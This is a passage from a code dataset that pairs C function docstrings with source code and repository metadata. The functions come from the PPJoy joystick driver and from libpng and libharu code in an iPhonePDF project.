RegistryPath->Length+sizeof(UNICODE_NULL)+sizeof(PARAM_KEY_NAME);\n Globals.ParamRegistryPath.Length= RegistryPath->Length;\n Globals.ParamRegistryPath.Buffer= ExAllocatePoolWithTag (PagedPool,Globals.ParamRegistryPath.MaximumLength,PPJOYBUS_POOL_TAG);    \n\n if (!Globals.ParamRegistryPath.Buffer)\n {\n  PPJoyBus_WriteEventLog (PPJ_MSG_ERRORALLOCMEM,&ntStatus,sizeof(ntStatus),L\"\");\n  ntStatus= STATUS_INSUFFICIENT_RESOURCES;\n  goto Exit;\n }\n\n /* Copy driver registry path and append the parameters subkey name */\n RtlCopyUnicodeString (&Globals.ParamRegistryPath,RegistryPath);\n RtlAppendUnicodeToString (&Globals.ParamRegistryPath,PARAM_KEY_NAME);\n\n ExInitializeFastMutex (&Globals.Mutex);\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_BABBLE2, (\"ParamRegistryPath=%S\",Globals.ParamRegistryPath.Buffer) );\n\n /* Set up pointers to our other entry points in the DeviceObject */\n DriverObject->MajorFunction[IRP_MJ_CREATE]= PPJoyBus_CreateClose;\n DriverObject->MajorFunction[IRP_MJ_CLOSE]=\tPPJoyBus_CreateClose;\n DriverObject->MajorFunction[IRP_MJ_POWER]= PPJoyBus_Power;\n DriverObject->MajorFunction[IRP_MJ_PNP]= PPJoyBus_PnP;\n DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL]= PPJoyBus_Ioctl;\n DriverObject->MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL]= PPJoyBus_InternalIoctl;\n DriverObject->DriverUnload= PPJoyBus_Unload;\n DriverObject->DriverExtension->AddDevice= PPJoyBus_AddDevice;\n\n PPJoyBus_WriteEventLog (PPJ_MSG_DRIVERSTARTEDVER,&ntStatus,sizeof(ntStatus),LVER_PRODUCTVERSION_STR);\n\nExit:\n PPJOY_EXITPROC (FILE_PPJOYBUS|PPJOY_FEXIT_STATUSOK , \"DriverEntry\", ntStatus);\n\n return ntStatus;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* This routine called when the driver unloads from memory. It should     */\n/* any resources allocated by the driver that is not yet freed.           */\n/**************************************************************************/\n", "func_signal": "VOID PPJoyBus_Unload (IN PDRIVER_OBJECT DriverObject)", "code": "{\n int\tCount;\n\n PAGED_CODE();\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"PPJoyBus_Unload Enter\") );\n\n /* If we allocated buffer for the registry path, then free is */\n if (Globals.ParamRegistryPath.Buffer)\n  ExFreePool(Globals.ParamRegistryPath.Buffer);   \n\n /* Release the FileObj reference on all the parallel ports we have opened */\n /* in the PnP interface notification routine. Also free the buffer for    */\n /* the device SymbolicLinkName, if allocated.                             */\n for (Count=0;Count<MAX_PARPORTS;Count++)\n {\n  if (Globals.ParPorts[Count].FileObj)\n   ObDereferenceObject (Globals.ParPorts[Count].FileObj);\n\n  if (Globals.ParPorts[Count].SymLinkName.Buffer)\n   ExFreePool(Globals.ParPorts[Count].SymLinkName.Buffer);   \n }\n\n PPJOY_EXITPROC (FILE_PPJOYBUS|PPJOY_FEXIT_STATUSOK, \"PPJoyBus_Unload:\",STATUS_SUCCESS );\n return;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Routine to route IOCTL requests for the Bus FDO and the Joystick PDO   */\n/**************************************************************************/\n", "func_signal": "NTSTATUS PPJoyBus_Ioctl (IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)", "code": "{\n NTSTATUS\t\t\t\tntStatus;\n PCOMMON_DATA\t\t\tCommonData;\n\n PAGED_CODE ();\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"PPJoyBus_Ioctl(DeviceObject=0x%p,Irp=0x%p)\",DeviceObject,Irp) );\n\n CommonData= DeviceObject->DeviceExtension;\n\n ntStatus= PPJoyBus_EnterRequest(CommonData);\n if (!NT_SUCCESS(ntStatus))\n  goto ExitAndComplete;\n\n if (!(CommonData->Flags&PPJFLAGS_STARTED))\n {\n  ntStatus= STATUS_DEVICE_NOT_READY;\n  goto ExitAndComplete;\n }\n\n if (CommonData->Flags&PPJFLAGS_ISBUSDEV)\n  ntStatus= PPJoyBus_Ioctl_Bus (DeviceObject,Irp);\n else\n  ntStatus= PPJoyBus_Ioctl_Joy (DeviceObject,Irp);\n goto ExitNoComplete;\t/* Already completed or passed on to lower driver */\n\nExitAndComplete:\n /* Set status in IRP and complete the request */\n Irp->IoStatus.Status= ntStatus;\n IoCompleteRequest (Irp,IO_NO_INCREMENT);\n\nExitNoComplete:\n PPJoyBus_LeaveRequest(CommonData);\n PPJOY_EXITPROC (FILE_PPJOYBUS|PPJOY_FEXIT_STATUSOK, \"PPJoyBus_Ioctl\", ntStatus);\n return ntStatus;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Callback function for CreateFromRegistry. Does all the hard work.      */\n/**************************************************************************/\n", "func_signal": "NTSTATUS PPJoyBus_RegQueryFunc (IN PWSTR ValueName, IN ULONG ValueType, IN PVOID ValueData,\n\t\t\t\t\t\t\t\tIN ULONG ValueLength, IN PVOID Context, IN PVOID EntryContext)", "code": "{\n NTSTATUS\tntStatus;\n UCHAR\t\tLPTNumber;\n UCHAR\t\tJoyType;\n UCHAR\t\tUnitNumber;\n\n PAGED_CODE ();\n\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"PPJoyBus_RegQueryFunc(ValueName=%S, ValueType=%d, ValueData= 0x%p, ValueLength= %d, Context= 0x%p, EntryContext= 0x%p)\",ValueName,ValueType,ValueData,ValueLength,Context,EntryContext) );\n\n /* Check for and exclude values for PPJoyBus options */\n if (!_wcsicmp(ValueName,PPJOY_OPTNAME_RUNTIMEDEBUG))\n  goto ExitOK;\n if (!_wcsicmp(ValueName,PPJOY_OPTNAME_PORTFLAGS))\n  goto ExitOK;\n\n /* Check to see if ValueName conforms to our format */\n if (ValueType!=REG_BINARY)\n {\n  PPJOY_DBGPRINT (FILE_PPJOYBUS | PPJOY_WARN, (\"Invalid registry data type, ignoring entry %S\",ValueName) );\n  goto Exit;\n }\n\n if (ValueLength!=sizeof(JOYSTICK_CONFIG1))\n {\n  PPJOY_DBGPRINT (FILE_PPJOYBUS | PPJOY_WARN, (\"Invalid registry data size, ignoring entry %S\",ValueName) );\n  goto Exit;\n }\n\n if ( ((PJOYSTICK_CONFIG1)ValueData)->Size!=sizeof(JOYSTICK_CONFIG1))\n {\n  PPJOY_DBGPRINT (FILE_PPJOYBUS | PPJOY_WARN, (\"Invalid registry data - size is wrong, ignoring entry %S\",ValueName) );\n  goto Exit;\n }\n\n if (!PPJoyBus_CrackParamString(ValueName,&LPTNumber,&JoyType,&UnitNumber))\n {\n  PPJOY_DBGPRINT (FILE_PPJOYBUS | PPJOY_WARN, (\"Invalid registry data - cannot parse name to LPT+Type+Unit, ignoring entry %S\",ValueName) );\n  goto Exit;\n }\n\n if (((PJOYSTICK_CONFIG1)ValueData)->LPTNumber!=LPTNumber)\n {\n  PPJOY_DBGPRINT (FILE_PPJOYBUS | PPJOY_WARN, (\"Invalid registry data - LPTNumber mismatch, ignoring entry %S\",ValueName) );\n  goto Exit;\n }\n\n if (((PJOYSTICK_CONFIG1)ValueData)->JoyType!=JoyType)\n {\n  PPJOY_DBGPRINT (FILE_PPJOYBUS | PPJOY_WARN, (\"Invalid registry data - JoyType mismatch, ignoring entry %S\",ValueName) );\n  goto Exit;\n }\n\n if (((PJOYSTICK_CONFIG1)ValueData)->UnitNumber!=UnitNumber)\n {\n  PPJOY_DBGPRINT (FILE_PPJOYBUS | PPJOY_WARN, (\"Invalid registry data - UnitNumber mismatch, ignoring entry %S\",ValueName) );\n  goto Exit;\n }\n\n /* Entry looks OK. Call AddJoystick routine to create and setup the PDO.  */\n PPJoyBus_AddJoystick ((PDEVICE_OBJECT)Context,(PJOYSTICK_CONFIG1)ValueData,0);\n goto ExitOK;\n\nExit:\n  PPJoyBus_WriteEventLog (PPJ_MSG_ERRORJOYREGISTRY,&ntStatus,sizeof(ntStatus),ValueName);\n\nExitOK:\n /* Routine MUST return success */\n ntStatus= STATUS_SUCCESS;\n\n PPJOY_EXITPROC (FILE_PPJOYBUS | PPJOY_FEXIT_STATUSOK, \"PPJoyBus_RegQueryFunc:\", ntStatus );\n return ntStatus;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "//---------------------------------------------------------------------------\n", "func_signal": "void StartPropo(void)", "code": "{\n    int i;\n    waveRecording = TRUE;\n    waveFmt.wFormatTag = WAVE_FORMAT_PCM;\n    waveFmt.nChannels = 1;\n    waveFmt.nSamplesPerSec = 44100;\n    waveFmt.wBitsPerSample =16;\n    waveFmt.nBlockAlign = waveFmt.wBitsPerSample / 8 * waveFmt.nChannels;\n    waveFmt.nAvgBytesPerSec = waveFmt.nSamplesPerSec * waveFmt.nBlockAlign;\n    waveFmt.cbSize = 0;\n    waveInOpen (&waveIn, WAVE_MAPPER, &waveFmt, (DWORD)(waveInProc), 0, CALLBACK_FUNCTION);\n    for (i = 0; i < 2; i++) {\n        waveBuf[i] = (WAVEHDR*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(WAVEHDR));\n        waveBuf[i]->lpData = (char*)HeapAlloc(GetProcessHeap(), 0, waveBufSize);\n        waveBuf[i]->dwBufferLength = waveBufSize;\n        waveBuf[i]->dwUser = i;\n        waveInPrepareHeader (waveIn, waveBuf[i], sizeof(WAVEHDR));\n        waveInAddBuffer (waveIn, waveBuf[i], sizeof(WAVEHDR));\n    }\n    waveInStart (waveIn);\n}", "path": "RCCallbackDLLs\\main.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Interface initialisation routines                                      */\n/**************************************************************************/\n", "func_signal": "void InitIanHarries (PUCHAR BasePort, UCHAR JoyType)", "code": "{\n PAGED_CODE();\n\n /* Standard forward mode */\n WRITE_PORT_UCHAR (CONTROLPORT(BasePort),CONTROL_FORWARD);\n\n /* Set D3-D7 to +5V to power interface */\n WRITE_PORT_UCHAR (DATAPORT(BasePort),0xF8);\n}", "path": "PPortJoy\\Joystick.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Routine to route Internal IOCTL requests for the Bus FDO and the       */\n/* Joystick PDO.                                                          */\n/**************************************************************************/\n", "func_signal": "NTSTATUS PPJoyBus_InternalIoctl (IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)", "code": "{\n NTSTATUS\t\t\t\tntStatus;\n PCOMMON_DATA\t\t\tCommonData;\n\n PAGED_CODE ();\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"PPJoyBus_InternalIoctl(DeviceObject=0x%p,Irp=0x%p)\",DeviceObject,Irp) );\n\n CommonData= DeviceObject->DeviceExtension;\n\n ntStatus= PPJoyBus_EnterRequest(CommonData);\n if (!NT_SUCCESS(ntStatus))\n  goto ExitAndComplete;\n\n if (!(CommonData->Flags&PPJFLAGS_STARTED))\n {\n  ntStatus= STATUS_DEVICE_NOT_READY;\n  goto ExitAndComplete;\n }\n\n if (CommonData->Flags&PPJFLAGS_ISBUSDEV)\n  ntStatus= PPJoyBus_InternalIoctl_Bus (DeviceObject,Irp);\n else\n  ntStatus= PPJoyBus_InternalIoctl_Joy (DeviceObject,Irp);\n goto ExitNoComplete;\t/* Already completed or passed on to lower driver */\n\nExitAndComplete:\n /* Set status in IRP and complete the request */\n Irp->IoStatus.Status= ntStatus;\n IoCompleteRequest (Irp,IO_NO_INCREMENT);\n\nExitNoComplete:\n PPJoyBus_LeaveRequest(CommonData);\n PPJOY_EXITPROC (FILE_PPJOYBUS|PPJOY_FEXIT_STATUSOK, \"PPJoyBus_InternalIoctl\", ntStatus);\n return ntStatus;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Routine to route Power requests for the Bus FDO and the Joystick PDO.  */\n/**************************************************************************/\n", "func_signal": "NTSTATUS PPJoyBus_Power (IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)", "code": "{\n NTSTATUS\t\tntStatus;\n PCOMMON_DATA\tCommonData;\n\n PAGED_CODE ();\n\n PPJOY_DBGPRINT (FILE_PPJOYBUS|PPJOY_FENTRY, (\"PPJoyBus_Power(DeviceObject=0x%p,Irp=0x%p)\",DeviceObject,Irp) );\n\n CommonData= DeviceObject->DeviceExtension;\n\n ntStatus= PPJoyBus_EnterRequest(CommonData);\n if (!NT_SUCCESS(ntStatus))\n {\n  /* Must always call PoStartNextPowerIrp()!!! */\n  PoStartNextPowerIrp (Irp);\n  /* Set status in IRP and complete the request */\n  Irp->IoStatus.Status= ntStatus;\n  IoCompleteRequest (Irp,IO_NO_INCREMENT);\n  goto Exit;\n }\n\n if (CommonData->Flags&PPJFLAGS_ISBUSDEV)\n  ntStatus= PPJoyBus_Power_Bus (DeviceObject,Irp);\n else\n  ntStatus= PPJoyBus_Power_Joy (DeviceObject,Irp);\n \nExit:\n PPJoyBus_LeaveRequest(CommonData);\n PPJOY_EXITPROC (FILE_PPJOYBUS|PPJOY_FEXIT_STATUSOK, \"PPJoyBus_Power\",ntStatus);\n return ntStatus;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "////////////////// Here's the beef //////////////////////////////////////////\n", "func_signal": "int __stdcall InitDLL (AsyncDLL_Callback_Proto CallbackFunc)", "code": "{\n if (!CallbackFunc)\n  return 0;\n\n UpdatePPJoy= CallbackFunc;\n StartPropo();\n\n return 1;\n}", "path": "RCCallbackDLLs\\main.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/**************************************************************************/\n/* Routine to convert hex digit into an integer. Function return 1 on     */\n/* success and 0 in case of error.                                        */\n/**************************************************************************/\n", "func_signal": "ULONG PPJoyBus_GetHexDigit (IN WCHAR Char, OUT UCHAR *Value)", "code": "{\n PAGED_CODE ();\n\n if ((Char>='0')&&(Char<='9'))\n {\n  *Value= Char-'0';\n  return 1;\n }\n\n if ((Char>='a')&&(Char<='f'))\n {\n  *Value= Char-'a'+10;\n  return 1;\n }\n\n if ((Char>='A')&&(Char<='F'))\n {\n  *Value= Char-'A'+10;\n  return 1;\n }\n\n return 0;\n}", "path": "PPJoyBus\\PPJoyBus.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "// Executes a command and return its exit code a return value. A single\n// parameter is passed to the executable as argv[0]; and is enclosed in\n// quotes. Returns 0 in case of failure.\n", "func_signal": "int RunHelper (char *MyModuleName, char *HelperName, char *Param)", "code": "{\n STARTUPINFO\t\t\tsi;\n PROCESS_INFORMATION\tpi;\n DWORD\t\t\t\t\tExitCode;\n char\t\t\t\t\tHelperFQN[_MAX_PATH+1];\n char\t\t\t\t\tParameters[4096];\n\n ZeroMemory (&si,sizeof(si));\n si.cb= sizeof(si);\n ZeroMemory (&pi,sizeof(pi));\n\n // Build string with (self) path and helper name, surrounded by quotes.\n GetMyDirectory (MyModuleName,HelperFQN,sizeof(HelperFQN));\n strcat (HelperFQN,HelperName);\n\n Parameters[0]= '\\\"';\n strcpy (Parameters+1,Param);\n strcat (Parameters,\"\\\"\");\n\n DebugPrintf ((\"Helper for 64bit operation is '%s', parameters '%s'\\n\",HelperFQN,Parameters))\n\n // NB: The Unicode version of CreateProcessW expects the commandline parameter to\n // to be writable. We will use the source path buffer. (Only pass source dir)\n if (!CreateProcess(HelperFQN,Parameters,NULL,NULL,FALSE,CREATE_NO_WINDOW,NULL,NULL,&si,&pi))\n {\n  DebugPrintf ((\"CreateProcess() error code %d trying to start helper %s\\n\",GetLastError(),HelperFQN))\n  return 0;\t\t// Create process error - install failed.\n }\n\n // Wait until child process exits and get the return code\n WaitForSingleObject (pi.hProcess,INFINITE);\n if (!GetExitCodeProcess(pi.hProcess,&ExitCode))\n {\n  DebugPrintf ((\"GetExitCodeProcess() error code %d trying to get helper exit code\\n\",GetLastError()))\n  ExitCode= 0;\t\t// Return a zero on failure\n }\n\n // Close process and thread handles. \n CloseHandle (pi.hProcess);\n CloseHandle (pi.hThread);\n\n DebugPrintf ((\"Helper process exit code was %d\\n\",ExitCode))\n\n return ExitCode; // Return exit code from the called process\n}", "path": "AddJoyDrivers\\UtilFunc.c", "repo_name": "elitak/PPJoy", "stars": 117, "license": "other", "language": "c", "size": 1769}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_swap(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_swap\");\n   if (\n#if defined(PNG_USELESS_TESTS_SUPPORTED)\n       row != NULL && row_info != NULL &&\n#endif\n       row_info->bit_depth == 16)\n   {\n      png_bytep rp = row;\n      png_uint_32 i;\n      png_uint_32 istop= row_info->width * row_info->channels;\n\n      for (i = 0; i < istop; i++, rp += 2)\n      {\n         png_byte t = *rp;\n         *rp = *(rp + 1);\n         *(rp + 1) = t;\n      }\n   }\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Turn on packed pixel swapping */\n", "func_signal": "void PNGAPI\npng_set_packswap(png_structp png_ptr)", "code": "{\n   png_debug(1, \"in png_set_packswap\");\n   if (png_ptr == NULL)\n      return;\n   if (png_ptr->bit_depth < 8)\n      png_ptr->transformations |= PNG_PACKSWAP;\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/*----- Catalog ------------------------------------------------------------*/\n", "func_signal": "HPDF_EXPORT(HPDF_PageLayout)\nHPDF_GetPageLayout  (HPDF_Doc   pdf)", "code": "{\n    HPDF_PTRACE ((\" HPDF_GetPageLayout\\n\"));\n\n    if (!HPDF_HasDoc (pdf))\n        return HPDF_PAGE_LAYOUT_SINGLE;\n\n    return HPDF_Catalog_GetPageLayout (pdf->catalog);\n}", "path": "Support\\libharu\\hpdf_doc.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_invert(png_row_infop row_info, png_bytep row)", "code": "{\n   png_debug(1, \"in png_do_invert\");\n  /* This test removed from libpng version 1.0.13 and 1.2.0:\n   *   if (row_info->bit_depth == 1 &&\n   */\n#if defined(PNG_USELESS_TESTS_SUPPORTED)\n   if (row == NULL || row_info == NULL)\n     return;\n#endif\n   if (row_info->color_type == PNG_COLOR_TYPE_GRAY)\n   {\n      png_bytep rp = row;\n      png_uint_32 i;\n      png_uint_32 istop = row_info->rowbytes;\n\n      for (i = 0; i < istop; i++)\n      {\n         *rp = (png_byte)(~(*rp));\n         rp++;\n      }\n   }\n   else if (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA &&\n      row_info->bit_depth == 8)\n   {\n      png_bytep rp = row;\n      png_uint_32 i;\n      png_uint_32 istop = row_info->rowbytes;\n\n      for (i = 0; i < istop; i+=2)\n      {\n         *rp = (png_byte)(~(*rp));\n         rp+=2;\n      }\n   }\n   else if (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA &&\n      row_info->bit_depth == 16)\n   {\n      png_bytep rp = row;\n      png_uint_32 i;\n      png_uint_32 istop = row_info->rowbytes;\n\n      for (i = 0; i < istop; i+=4)\n      {\n         *rp = (png_byte)(~(*rp));\n         *(rp+1) = (png_byte)(~(*(rp+1)));\n         rp+=4;\n      }\n   }\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* Alternate create PNG structure for reading, and allocate any memory needed. */\n", "func_signal": "png_structp PNGAPI\npng_create_read_struct_2(png_const_charp user_png_ver, png_voidp error_ptr,\n   png_error_ptr error_fn, png_error_ptr warn_fn, png_voidp mem_ptr,\n   png_malloc_ptr malloc_fn, png_free_ptr free_fn)", "code": "{\n#endif /* PNG_USER_MEM_SUPPORTED */\n\n#ifdef PNG_SETJMP_SUPPORTED\n   volatile\n#endif\n   png_structp png_ptr;\n\n#ifdef PNG_SETJMP_SUPPORTED\n#ifdef USE_FAR_KEYWORD\n   jmp_buf jmpbuf;\n#endif\n#endif\n\n   int i;\n\n   png_debug(1, \"in png_create_read_struct\");\n#ifdef PNG_USER_MEM_SUPPORTED\n   png_ptr = (png_structp)png_create_struct_2(PNG_STRUCT_PNG,\n      (png_malloc_ptr)malloc_fn, (png_voidp)mem_ptr);\n#else\n   png_ptr = (png_structp)png_create_struct(PNG_STRUCT_PNG);\n#endif\n   if (png_ptr == NULL)\n      return (NULL);\n\n   /* Added at libpng-1.2.6 */\n#ifdef PNG_SET_USER_LIMITS_SUPPORTED\n   png_ptr->user_width_max=PNG_USER_WIDTH_MAX;\n   png_ptr->user_height_max=PNG_USER_HEIGHT_MAX;\n#endif\n\n#ifdef PNG_SETJMP_SUPPORTED\n#ifdef USE_FAR_KEYWORD\n   if (setjmp(jmpbuf))\n#else\n   if (setjmp(png_ptr->jmpbuf))\n#endif\n   {\n      png_free(png_ptr, png_ptr->zbuf);\n      png_ptr->zbuf = NULL;\n#ifdef PNG_USER_MEM_SUPPORTED\n      png_destroy_struct_2((png_voidp)png_ptr,\n         (png_free_ptr)free_fn, (png_voidp)mem_ptr);\n#else\n      png_destroy_struct((png_voidp)png_ptr);\n#endif\n      return (NULL);\n   }\n#ifdef USE_FAR_KEYWORD\n   png_memcpy(png_ptr->jmpbuf, jmpbuf, png_sizeof(jmp_buf));\n#endif\n#endif\n\n#ifdef PNG_USER_MEM_SUPPORTED\n   png_set_mem_fn(png_ptr, mem_ptr, malloc_fn, free_fn);\n#endif\n\n   png_set_error_fn(png_ptr, error_ptr, error_fn, warn_fn);\n\n   if (user_png_ver)\n   {\n     i = 0;\n     do\n     {\n       if (user_png_ver[i] != png_libpng_ver[i])\n          png_ptr->flags |= PNG_FLAG_LIBRARY_MISMATCH;\n     } while (png_libpng_ver[i++]);\n   }\n   else\n        png_ptr->flags |= PNG_FLAG_LIBRARY_MISMATCH;\n\n\n   if (png_ptr->flags & PNG_FLAG_LIBRARY_MISMATCH)\n   {\n     /* Libpng 0.90 and later are binary incompatible with libpng 0.89, so\n      * we must recompile any applications that use any older library version.\n      * For versions after libpng 1.0, we will be compatible, so we need\n      * only check the first digit.\n      */\n     if (user_png_ver == NULL || user_png_ver[0] != png_libpng_ver[0] ||\n         (user_png_ver[0] == '1' && user_png_ver[2] != png_libpng_ver[2]) ||\n         (user_png_ver[0] == '0' && user_png_ver[2] < '9'))\n     {\n#if !defined(PNG_NO_STDIO) && !defined(_WIN32_WCE)\n        char msg[80];\n        if (user_png_ver)\n        {\n          png_snprintf(msg, 80,\n             \"Application was compiled with png.h from libpng-%.20s\",\n             user_png_ver);\n          png_warning(png_ptr, msg);\n        }\n        png_snprintf(msg, 80,\n             \"Application  is  running with png.c from libpng-%.20s\",\n           png_libpng_ver);\n        png_warning(png_ptr, msg);\n#endif\n#ifdef PNG_ERROR_NUMBERS_SUPPORTED\n        png_ptr->flags = 0;\n#endif\n        png_error(png_ptr,\n           \"Incompatible libpng version in application and library\");\n     }\n   }\n\n   /* Initialize zbuf - compression buffer */\n   png_ptr->zbuf_size = PNG_ZBUF_SIZE;\n   png_ptr->zbuf = (png_bytep)png_malloc(png_ptr,\n     (png_uint_32)png_ptr->zbuf_size);\n   png_ptr->zstream.zalloc = png_zalloc;\n   png_ptr->zstream.zfree = png_zfree;\n   png_ptr->zstream.opaque = (voidpf)png_ptr;\n\n   switch (inflateInit(&png_ptr->zstream))\n   {\n     case Z_OK: /* Do nothing */ break;\n     case Z_MEM_ERROR:\n     case Z_STREAM_ERROR: png_error(png_ptr, \"zlib memory error\"); break;\n     case Z_VERSION_ERROR: png_error(png_ptr, \"zlib version error\"); break;\n     default: png_error(png_ptr, \"Unknown zlib error\");\n   }\n\n   png_ptr->zstream.next_out = png_ptr->zbuf;\n   png_ptr->zstream.avail_out = (uInt)png_ptr->zbuf_size;\n\n   png_set_read_fn(png_ptr, png_voidp_NULL, png_rw_ptr_NULL);\n\n#ifdef PNG_SETJMP_SUPPORTED\n/* Applications that neglect to set up their own setjmp() and then encounter\n   a png_error() will longjmp here.  Since the jmpbuf is then meaningless we\n   abort instead of returning. */\n#ifdef USE_FAR_KEYWORD\n   if (setjmp(jmpbuf))\n      PNG_ABORT();\n   png_memcpy(png_ptr->jmpbuf, jmpbuf, png_sizeof(jmp_buf));\n#else\n   if (setjmp(png_ptr->jmpbuf))\n      PNG_ABORT();\n#endif\n#endif\n   return (png_ptr);\n}", "path": "Support\\libpng\\pngread.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
{"docstring": "/* PRIVATE */\n", "func_signal": "png_do_strip_filler(png_row_infop row_info, png_bytep row, png_uint_32 flags)", "code": "{\n   png_debug(1, \"in png_do_strip_filler\");\n#if defined(PNG_USELESS_TESTS_SUPPORTED)\n   if (row != NULL && row_info != NULL)\n#endif\n   {\n      png_bytep sp=row;\n      png_bytep dp=row;\n      png_uint_32 row_width=row_info->width;\n      png_uint_32 i;\n\n      if ((row_info->color_type == PNG_COLOR_TYPE_RGB ||\n          (row_info->color_type == PNG_COLOR_TYPE_RGB_ALPHA &&\n          (flags & PNG_FLAG_STRIP_ALPHA))) &&\n          row_info->channels == 4)\n      {\n         if (row_info->bit_depth == 8)\n         {\n            /* This converts from RGBX or RGBA to RGB */\n            if (flags & PNG_FLAG_FILLER_AFTER)\n            {\n               dp+=3; sp+=4;\n               for (i = 1; i < row_width; i++)\n               {\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  sp++;\n               }\n            }\n            /* This converts from XRGB or ARGB to RGB */\n            else\n            {\n               for (i = 0; i < row_width; i++)\n               {\n                  sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n               }\n            }\n            row_info->pixel_depth = 24;\n            row_info->rowbytes = row_width * 3;\n         }\n         else /* if (row_info->bit_depth == 16) */\n         {\n            if (flags & PNG_FLAG_FILLER_AFTER)\n            {\n               /* This converts from RRGGBBXX or RRGGBBAA to RRGGBB */\n               sp += 8; dp += 6;\n               for (i = 1; i < row_width; i++)\n               {\n                  /* This could be (although png_memcpy is probably slower):\n                  png_memcpy(dp, sp, 6);\n                  sp += 8;\n                  dp += 6;\n                  */\n\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  sp += 2;\n               }\n            }\n            else\n            {\n               /* This converts from XXRRGGBB or AARRGGBB to RRGGBB */\n               for (i = 0; i < row_width; i++)\n               {\n                  /* This could be (although png_memcpy is probably slower):\n                  png_memcpy(dp, sp, 6);\n                  sp += 8;\n                  dp += 6;\n                  */\n\n                  sp+=2;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n               }\n            }\n            row_info->pixel_depth = 48;\n            row_info->rowbytes = row_width * 6;\n         }\n         row_info->channels = 3;\n      }\n      else if ((row_info->color_type == PNG_COLOR_TYPE_GRAY ||\n         (row_info->color_type == PNG_COLOR_TYPE_GRAY_ALPHA &&\n         (flags & PNG_FLAG_STRIP_ALPHA))) &&\n          row_info->channels == 2)\n      {\n         if (row_info->bit_depth == 8)\n         {\n            /* This converts from GX or GA to G */\n            if (flags & PNG_FLAG_FILLER_AFTER)\n            {\n               for (i = 0; i < row_width; i++)\n               {\n                  *dp++ = *sp++;\n                  sp++;\n               }\n            }\n            /* This converts from XG or AG to G */\n            else\n            {\n               for (i = 0; i < row_width; i++)\n               {\n                  sp++;\n                  *dp++ = *sp++;\n               }\n            }\n            row_info->pixel_depth = 8;\n            row_info->rowbytes = row_width;\n         }\n         else /* if (row_info->bit_depth == 16) */\n         {\n            if (flags & PNG_FLAG_FILLER_AFTER)\n            {\n               /* This converts from GGXX or GGAA to GG */\n               sp += 4; dp += 2;\n               for (i = 1; i < row_width; i++)\n               {\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n                  sp += 2;\n               }\n            }\n            else\n            {\n               /* This converts from XXGG or AAGG to GG */\n               for (i = 0; i < row_width; i++)\n               {\n                  sp += 2;\n                  *dp++ = *sp++;\n                  *dp++ = *sp++;\n               }\n            }\n            row_info->pixel_depth = 16;\n            row_info->rowbytes = row_width * 2;\n         }\n         row_info->channels = 1;\n      }\n      if (flags & PNG_FLAG_STRIP_ALPHA)\n        row_info->color_type &= ~PNG_COLOR_MASK_ALPHA;\n   }\n}", "path": "Support\\libpng\\pngtrans.c", "repo_name": "akisute/iPhonePDF", "stars": 103, "license": "other", "language": "c", "size": 413}
